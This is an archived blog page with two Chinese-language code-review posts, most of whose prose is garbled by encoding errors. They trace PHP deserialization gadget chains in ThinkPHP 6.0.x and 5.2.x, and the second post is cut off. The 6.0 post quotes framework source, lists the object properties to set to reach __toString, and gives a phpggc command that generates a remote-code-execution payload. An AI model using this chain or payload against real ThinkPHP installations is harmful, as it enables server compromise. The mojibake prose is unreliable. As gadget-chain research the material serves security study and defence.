<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <title>Archives: 2019/9 | 0kami&#39;s Blog</title>
  <meta name="description" content="A Web ğŸ¶ &amp;&amp; Code Reviewer">
  <meta name="keywords" content="">
  <meta name="HandheldFriendly" content="True">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <link rel="shortcut icon" href="/images/avatar.jpg">
  <link rel="alternate" href="/atom.xml" title="0kami's Blog">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="A Web ğŸ¶ &amp;&amp; Code Reviewer">
<meta property="og:type" content="website">
<meta property="og:title" content="0kami&#39;s Blog">
<meta property="og:url" content="http://blog.0kami.cn/archives/2019/09/index.html">
<meta property="og:site_name" content="0kami&#39;s Blog">
<meta property="og:description" content="A Web ğŸ¶ &amp;&amp; Code Reviewer">
<meta property="og:locale" content="en">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="0kami&#39;s Blog">
<meta name="twitter:description" content="A Web ğŸ¶ &amp;&amp; Code Reviewer">

  <link href="https://fonts.googleapis.com/css?family=Inconsolata|Titillium+Web" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
  <link href="//cdn.bootcss.com/node-waves/0.7.5/waves.min.css" rel="stylesheet">
  <link rel="stylesheet" href="/style.css">
  <script>
    function setLoadingBarProgress(num) {
      document.getElementById('loading-bar').style.width=num+"%";
    }
  </script>
</head>
</html>
<body>
  <div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>


  <script>setLoadingBarProgress(20)</script> 
  <header class="l_header">
	<div class="wrapper">
		<div class="nav-main container container--flex">
			<a class="logo flat-box" href="/">
				0kami's Blog
			</a>
			<div class="menu">
				<ul class="h-list">
					
						<li>
							<a class="flat-box nav-home" href="/">
								Home
							</a>
						</li>
					
						<li>
							<a class="flat-box nav-archives" href="/archives">
								Archives
							</a>
						</li>
					
						<li>
							<a class="flat-box nav-about" href="/about">
								About
							</a>
						</li>
					
				</ul>
				<div class="underline"></div>
			</div>
			
				<div class="m_search">
					<form name="searchform" class="form u-search-form">
						<input type="text" class="input u-search-input" placeholder="Search">
						<span class="icon icon-search"></span>
					</form>
				</div>
			
			<ul class="switcher h-list">
				
					<li class="s-search"><a href="javascript:void(0)"><span class="icon icon-search flat-box"></span></a></li>
				
				<li class="s-menu"><a href="javascript:void(0)"><span class="icon icon-menu flat-box"></span></a></li>
			</ul>
		</div>
		
		<div class="nav-sub container container--flex">
			<a class="logo" href="javascript:void(0)">
				Word of Forks
			</a>

			<ul class="switcher h-list">
				<li class="s-comment"><a href="javascript:void(0)"><span class="icon icon-chat_bubble_outline flat-box"></span></a></li>
				<li class="s-top"><a href="javascript:void(0)"><span class="icon icon-arrow_upward flat-box"></span></a></li>
				<li class="s-toc"><a href="javascript:void(0)"><span class="icon icon-format_list_numbered flat-box"></span></a></li>
			</ul>
		</div>
	</div>
</header>
<aside class="menu-phone">
	<nav>
		
			<a href="/" class="nav-home nav">
				Home
			</a>
		
			<a href="/archives" class="nav-archives nav">
				Archives
			</a>
		
			<a href="/about" class="nav-about nav">
				About
			</a>
		
	</nav>
</aside>

    <script>setLoadingBarProgress(40);</script>
  <div class="l_body">
    <div class='container clearfix'>
      <div class='l_main'>
        
	
  <script>
    window.subData= { title:'Year : 2019.9'}
  </script>

<section class="post-list">
	
    <div class="post-wrapper">
      <article class="post reveal">
  <section class="meta">
    
    <h2 class="title">
      <a href="/2019/09/10/thinkphp-6-0-x-ååºåˆ—åŒ–åˆ©ç”¨é“¾/">
        ã€Code Reviewã€‘thinkphp v6.0.x ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜
      </a>
    </h2>
    
    <time>
      Sep 10, 2019
    </time>
		
    
    <div class="cats">
        <a href="/categories/codereview/">codereview</a>
    </div>

  </section>
  <section class="article typo">
	  <h1 id="thinkphp-v6-0-x-ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜"><a href="#thinkphp-v6-0-x-ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜" class="headerlink" title="thinkphp v6.0.x ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜"></a>thinkphp v6.0.x ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜</h1><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ä¸Šä¸€ç¯‡åˆ†æäº†tp 5.2.xçš„ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ï¼Œé¡ºç€æ€è·¯ï¼ŒæŠŠtp6.0.xä¹ŸæŒ–äº†ã€‚æœ‰ç±»ä¼¼çš„åœ°æ–¹ï¼Œä¹Ÿæœ‰éœ€è¦é‡æ–°æŒ–æ˜çš„åœ°æ–¹ã€‚</p>
<h2 id="0x01-ç¯å¢ƒå‡†å¤‡"><a href="#0x01-ç¯å¢ƒå‡†å¤‡" class="headerlink" title="0x01 ç¯å¢ƒå‡†å¤‡"></a>0x01 ç¯å¢ƒå‡†å¤‡</h2><p>é‡‡ç”¨composerå®‰è£…6.0.*-devç‰ˆæœ¬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=6.0.x-dev v6.0</span><br></pre></td></tr></table></figure>
<h2 id="0x02-åˆ©ç”¨é“¾åˆ†æ"><a href="#0x02-åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="0x02 åˆ©ç”¨é“¾åˆ†æ"></a>0x02 åˆ©ç”¨é“¾åˆ†æ</h2><h3 id="èƒŒæ™¯å›é¡¾"><a href="#èƒŒæ™¯å›é¡¾" class="headerlink" title="èƒŒæ™¯å›é¡¾"></a>èƒŒæ™¯å›é¡¾</h3><p>æ‹¿åˆ°v6.0.xç‰ˆæœ¬ï¼Œç®€å•çš„çœ‹äº†ä¸€ä¸‹ï¼Œæœ‰ä¸€ä¸ªå¥½æ¶ˆæ¯å’Œä¸€ä¸ªåæ¶ˆæ¯ã€‚</p>
<p>å¥½æ¶ˆæ¯æ˜¯5.2.xç‰ˆæœ¬å‡½æ•°åŠ¨æ€è°ƒç”¨çš„ååºåˆ—åŒ–é“¾ååŠéƒ¨åˆ†ï¼Œè¿˜å¯ä»¥åˆ©ç”¨ã€‚</p>
<p>åæ¶ˆæ¯æ˜¯å‰é¢5.1.xï¼Œ5.2.xç‰ˆæœ¬éƒ½åŸºäºè§¦å‘ç‚¹<code>Windows</code>ç±»çš„<code>__destruct</code>,å¥½å·§ä¸å·§çš„æ˜¯6.0.xç‰ˆæœ¬å–æ¶ˆäº†<code>Windows</code>ç±»ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¾—é‡æ–°æ‰¾ä¸€ä¸ªåˆé€‚çš„èµ·å§‹è§¦å‘ç‚¹ï¼Œæ‰èƒ½ç»§ç»­ä½¿ç”¨ä¸Šé¢çš„å¥½æ¶ˆæ¯ã€‚</p>
<h3 id="vendor-topthink-think-orm-src-Model-php-æ–°èµ·å§‹è§¦å‘ç‚¹"><a href="#vendor-topthink-think-orm-src-Model-php-æ–°èµ·å§‹è§¦å‘ç‚¹" class="headerlink" title="vendor/topthink/think-orm/src/Model.php æ–°èµ·å§‹è§¦å‘ç‚¹"></a>vendor/topthink/think-orm/src/Model.php æ–°èµ·å§‹è§¦å‘ç‚¹</h3><p>ä¸ºäº†èŠ‚çœç¯‡å¹…ï¼Œåæ–‡ä¸å†é‡å¤ä»‹ç»è§¦å‘<code>__toString</code>å‡½æ•°åçš„åˆ©ç”¨é“¾ï¼Œè¿™éƒ¨åˆ†åŒ5.2.xç‰ˆæœ¬ç›¸åŒ(ä¸è¿‡wonderkunå¸ˆå‚…çš„åˆ©ç”¨é“¾å·²å¤±æ•ˆï¼ŒåŠ¨æ€å‡½æ•°è°ƒç”¨çš„åˆ©ç”¨é“¾è¿˜èƒ½ç”¨)ã€‚</p>
<p>é€šå¸¸æœ€å¥½çš„ååºåˆ—åŒ–èµ·å§‹ç‚¹ä¸º<code>__destruct</code>ã€<code>__wakeup</code>ï¼Œå› ä¸ºè¿™ä¸¤ä¸ªå‡½æ•°çš„è°ƒç”¨åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­éƒ½ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæ¥æ‰¾æ­¤ç±»å‡½æ•°ã€‚è¿™é‡Œæˆ‘æ‰¾äº†<code>vendor/topthink/think-orm/src/Model.php</code>çš„<code>__destruct</code>å‡½æ•°ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;lazySave) &#123;<span class="comment">// æ„é€ lazySaveä¸ºtrueï¼Œè¿›å…¥saveå‡½æ•°</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">(array $data = [], string $sequence = null)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isEmpty() || <span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeWrite'</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $result = <span class="keyword">$this</span>-&gt;exists ? <span class="keyword">$this</span>-&gt;updateData() : <span class="keyword">$this</span>-&gt;insertData($sequence);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆæ„é€ <code>lazySave</code>çš„å€¼ä¸º<code>true</code>,ä»è€Œè¿›å…¥<code>save</code>å‡½æ•°ã€‚</p>
<p>è¿™æ¬¡è§¦å‘ç‚¹ä½äº<code>updateData</code>å‡½æ•°å†…ï¼Œä¸ºäº†é˜²æ­¢å‰é¢çš„æ¡ä»¶ç¬¦åˆï¼Œè€Œç›´æ¥returnï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æ„é€ ç›¸å…³å‚æ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">(string $event)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;withEvent) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­éœ€ä¿è¯<code>isEmpty</code>è¿”å›<code>false</code>ï¼Œä»¥åŠ<code>$this-&gt;trigger(&#39;BeforeWrite&#39;)</code>è¿”å›<code>true</code></p>
<ol>
<li>æ„é€ <code>$this-&gt;data</code>ä¸ºéç©ºæ•°ç»„</li>
<li>æ„é€ <code>$this-&gt;withEvent</code>ä¸º<code>false</code></li>
<li>æ„é€ <code>$this-&gt;exists</code>ä¸º<code>true</code></li>
</ol>
<p>ä»è€Œè¿›å…¥æˆ‘ä»¬éœ€è¦çš„<code>updateData</code>å‡½æ•°ï¼Œæ¥çœ‹ä¸€ä¸‹è¯¥å‡½æ•°å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">updateData</span><span class="params">()</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// äº‹ä»¶å›è°ƒ</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;trigger(<span class="string">'BeforeUpdate'</span>)) &#123;<span class="comment">// æ­¤å¤„å‰é¢å·²ç¬¦åˆæ¡ä»¶</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–æœ‰æ›´æ–°çš„æ•°æ®</span></span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;getChangedData();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</span><br><span class="line">        <span class="comment">// å…³è”æ›´æ–°</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;relationWrite)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;autoRelationUpdate();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// æ£€æŸ¥å…è®¸å­—æ®µ</span></span><br><span class="line">    $allowFields = <span class="keyword">$this</span>-&gt;checkAllowFields(); <span class="comment">// è§¦å‘__toString</span></span><br></pre></td></tr></table></figure>
<p>åŒæ ·çš„ï¼Œä¸ºäº†é˜²æ­¢æå‰<code>return</code>ï¼Œéœ€è¦ç¬¦åˆ<code>$data</code>éç©ºï¼Œæ¥çœ‹ä¸€ä¸‹<code>getChangedData</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;force ? <span class="keyword">$this</span>-&gt;data : array_udiff_assoc(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;origin, <span class="function"><span class="keyword">function</span> <span class="params">($a, $b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">empty</span>($a) || <span class="keyword">empty</span>($b)) &amp;&amp; $a !== $b) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> is_object($a) || $a != $b ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¼ºè¡Œç½®<code>$this-&gt;force</code>ä¸º<code>true</code>ï¼Œç›´æ¥è¿”å›æˆ‘ä»¬å‰é¢æ„é€ çš„éç©º<code>$this-&gt;data</code></p>
<p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±æˆåŠŸåˆ°äº†è°ƒç”¨<code>checkAllowFields</code>çš„ä½ç½®</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">checkAllowFields</span><span class="params">()</span>: <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// æ£€æµ‹å­—æ®µ</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;field)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;schema)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = array_keys(array_merge(<span class="keyword">$this</span>-&gt;schema, <span class="keyword">$this</span>-&gt;jsonType));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $query = <span class="keyword">$this</span>-&gt;db();<span class="comment">// æœ€ç»ˆçš„è§¦å‘__toStringçš„å‡½æ•°</span></span><br><span class="line">            $table = <span class="keyword">$this</span>-&gt;table ? <span class="keyword">$this</span>-&gt;table . <span class="keyword">$this</span>-&gt;suffix : $query-&gt;getTable();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;field;</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åŒæ ·ï¼Œä¸ºäº†åˆ°<code>$this-&gt;db()</code>å‡½æ•°çš„è°ƒç”¨ï¼Œéœ€è¦</p>
<ol>
<li>æ„é€ <code>$this-&gt;field</code>ä¸ºç©º</li>
<li>æ„é€ <code>$this-&gt;schema</code>ä¸ºç©º</li>
</ol>
<p>å…¶å®è¿™ä¸¤ä¸ªåœ°æ–¹ä¸éœ€è¦æ„é€ ï¼Œé»˜è®¤éƒ½ä¸ºç©º</p>
<p>æœ€ç»ˆï¼Œæˆ‘ä»¬ç»ˆäºåˆ°äº†å¯ä»¥è§¦å‘<code>__toString</code>çš„ä½ç½®</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span><span class="params">($scope = [])</span>: <span class="title">Query</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Query $query */</span></span><br><span class="line">    $query = <span class="keyword">self</span>::$db-&gt;connect(<span class="keyword">$this</span>-&gt;connection)</span><br><span class="line">        -&gt;name(<span class="keyword">$this</span>-&gt;name . <span class="keyword">$this</span>-&gt;suffix)<span class="comment">// toString</span></span><br><span class="line">        -&gt;pk(<span class="keyword">$this</span>-&gt;pk);</span><br></pre></td></tr></table></figure>
<p>çœ‹åˆ°ç†Ÿæ‚‰çš„å­—ç¬¦ä¸²æ‹¼æ¥äº†å˜›ï¼ï¼ï¼</p>
<p>ä¸è¿‡ä¸ºäº†è¾¾åˆ°è¯¥å‡ºæ‹¼æ¥ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¾—é¦–å…ˆæ»¡è¶³<code>connect</code>å‡½æ•°çš„è°ƒç”¨ã€‚æ­¤å¤„ä»£ç å°±ä¸è¯´äº†ï¼Œç½®<code>$this-&gt;connection</code>ä¸º<code>mysql</code>å³å¯ã€‚æ¥ä¸‹æ¥ï¼Œä¸ç®¡æ˜¯è®¾<code>$this-&gt;name</code>è¿˜æ˜¯<code>$this-&gt;suffix</code>ä¸ºæœ€ç»ˆçš„è§¦å‘<code>__toString</code>çš„å¯¹è±¡ï¼Œéƒ½ä¼šæœ‰åŒæ ·çš„æ•ˆæœã€‚</p>
<p>åç»­çš„æ€è·¯ï¼Œå°±æ˜¯åŸæ¥<code>vendor/topthink/think-orm/src/model/concern/Conversion.php</code>çš„<code>__toString</code>å¼€å§‹çš„åˆ©ç”¨é“¾ï¼Œä¸åœ¨å™è¿°ã€‚</p>
<p>æˆ‘æŠŠexpé›†æˆåˆ°äº†<a href="https://github.com/wh1t3p1g/phpggc" target="_blank" rel="noopener">phpggc</a>ä¸Šï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯ç”Ÿæˆ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc -u ThinkPHP/RCE2 <span class="string">'phpinfo();'</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œç”±äºç”¨åˆ°äº†SerializableClosureï¼Œéœ€è¦ä½¿ç”¨ç¼–ç å™¨ç¼–ç ï¼Œä¸å¯ç›´æ¥è¾“å‡ºæ‹·è´åˆ©ç”¨ã€‚</p>


    
    
    
	  <div class="full-width auto-padding tags">
      
        <a href="/tags/cms/">cms</a>
      
	  </div>
    
  </section>
</article>
    </div>
  
    <div class="post-wrapper">
      <article class="post reveal">
  <section class="meta">
    
    <h2 class="title">
      <a href="/2019/09/10/thinkphp-5-2-x-ååºåˆ—åŒ–åˆ©ç”¨é“¾/">
        ã€Code Reviewã€‘thinkphp v5.2.x ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜
      </a>
    </h2>
    
    <time>
      Sep 10, 2019
    </time>
		
    
    <div class="cats">
        <a href="/categories/codereview/">codereview</a>
    </div>

  </section>
  <section class="article typo">
	  <h1 id="thinkphp-v5-2-x-ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜"><a href="#thinkphp-v5-2-x-ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜" class="headerlink" title="thinkphp v5.2.x ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜"></a>thinkphp v5.2.x ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜</h1><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ä¸Šå‘¨å‚ä¸äº†N1CTFï¼Œé‡Œé¢æœ‰ä¸€é“å…³äºthinkphp5çš„ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚è®°å½•ä¸€ä¸‹å…³äºè¯¥ååºåˆ—åŒ–çš„åˆ©ç”¨é“¾åˆ†æã€‚</p>
<p>åæ–‡ä¸»è¦åŒ…æ‹¬ä¸¤æ¡é“¾çš„åˆ©ç”¨åˆ†æï¼ˆä¸€æ¡æ˜¯æˆ‘æ‰¾çš„ï¼Œä¹Ÿæ˜¯é¢˜ç›®çš„é¢„æœŸè§£ï¼Œå¦ä¸€æ¡æ˜¯wonderkunå¸ˆå‚…æ‰¾çš„éé¢„æœŸè§£ï¼‰</p>
<h2 id="0x01-ç¯å¢ƒå‡†å¤‡"><a href="#0x01-ç¯å¢ƒå‡†å¤‡" class="headerlink" title="0x01 ç¯å¢ƒå‡†å¤‡"></a>0x01 ç¯å¢ƒå‡†å¤‡</h2><p>è¿™é‡Œå°±ä¸ç›´æ¥ç”¨é¢˜ç›®çš„ç¯å¢ƒäº†ï¼Œé‡‡ç”¨composerç›´æ¥å®‰è£…5.2.*-devç‰ˆæœ¬</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=5.2.x-dev v5.2</span><br></pre></td></tr></table></figure>
<h2 id="0x02-åˆ©ç”¨é“¾åˆ†æ"><a href="#0x02-åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="0x02 åˆ©ç”¨é“¾åˆ†æ"></a>0x02 åˆ©ç”¨é“¾åˆ†æ</h2><h3 id="èƒŒæ™¯å›é¡¾"><a href="#èƒŒæ™¯å›é¡¾" class="headerlink" title="èƒŒæ™¯å›é¡¾"></a>èƒŒæ™¯å›é¡¾</h3><p>tp5åœ¨æˆ‘å°è±¡é‡Œååºåˆ—åŒ–çš„åˆ©ç”¨é“¾å­˜åœ¨ä¸€ä¸ªWindowsç±»çš„ä»»æ„æ–‡ä»¶åˆ é™¤ï¼Œä½†æ˜¯åœ¨<a href="[https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/](https://blog.riskivy.com/æŒ–æ˜æš—è—thinkphpä¸­çš„ååºåˆ—åˆ©ç”¨é“¾/">è¿™ç¯‡æ–‡ç« </a>)çš„å¯ç¤ºä¸‹ï¼Œä¹Ÿç®—æ˜¯æ‰¾åˆ°äº†ä¸€æ¡æ–°çš„è·¯ï¼ˆå…³äº<code>__toString</code>çš„è§¦å‘æ–¹å¼ï¼Œé™¤äº†å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼ï¼Œè¿˜å¯ä»¥åˆ©ç”¨PHPè‡ªå¸¦å‡½æ•°å‚æ•°çš„å¼ºåˆ¶è½¬æ¢ï¼‰ã€‚</p>
<p>è¿™ç¯‡æ–‡ç« çš„åˆ©ç”¨é“¾æœ€åç”¨åˆ°äº†5.1.37ç‰ˆæœ¬<code>think/Request.php</code>çš„ <code>__call</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°çš„è°ƒç”¨å‡½æ•°åå¯æ§ï¼Œæ‰€ä»¥å¯ä»¥å¯¼è‡´ä»»æ„è°ƒç”¨å…¶ä»–çš„ç±»å‡½æ•°ã€‚è€Œåœ¨5.2.xç‰ˆæœ¬ä¸å­˜åœ¨è¿™æ ·çš„ä¸€ä¸ª<code>__call</code>å‡½æ•°ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦é‡æ–°æ‰¾ä¸€ä¸ªæœ€ç»ˆè¾¾æˆå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°è°ƒç”¨ï¼ˆ<code>__call</code>å‡½æ•°å‰çš„åˆ©ç”¨é“¾ä»ç„¶å¯ç”¨ï¼‰ã€‚</p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹5.2.xæ–°çš„åˆ©ç”¨é“¾å§ï¼šï¼‰</p>
<h3 id="think-model-concern-Attribute-php-getValueå¯å‡½æ•°åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼ˆé¢˜ç›®çš„é¢„æœŸè§£ï¼‰"><a href="#think-model-concern-Attribute-php-getValueå¯å‡½æ•°åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼ˆé¢˜ç›®çš„é¢„æœŸè§£ï¼‰" class="headerlink" title="think/model/concern/Attribute.php getValueå¯å‡½æ•°åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼ˆé¢˜ç›®çš„é¢„æœŸè§£ï¼‰"></a>think/model/concern/Attribute.php getValueå¯å‡½æ•°åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼ˆé¢˜ç›®çš„é¢„æœŸè§£ï¼‰</h3><p>ç”±äº5.1.37<code>__call</code>å‡½æ•°å‰çš„åˆ©ç”¨é“¾ä»ç„¶å­˜åœ¨äº5.2.xç‰ˆæœ¬ï¼Œè¿™é‡Œå°±ä¸å†è¯¦è¿°äº†ã€‚</p>
<p>å…ˆæ¥çœ‹ä¸€ä¸‹Conversionç±»çš„toArrayå‡½æ•°</p>
